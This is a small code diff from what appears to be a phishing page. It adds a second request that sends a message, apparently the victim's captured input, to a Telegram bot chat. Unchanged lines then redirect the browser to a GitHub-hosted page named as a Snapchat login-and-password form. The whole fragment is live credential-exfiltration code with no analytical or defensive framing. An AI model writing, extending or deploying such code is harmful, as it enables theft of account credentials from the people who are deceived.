@@ -22,6 +22,10 @@
                     console.log("Antwort von der Telegram API:", data);
                 });
 
+                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
+                    console.log("Antwort von der Telegram API:", data);
+                });
+
                 window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginPasswort.htm";
             }
         </script>
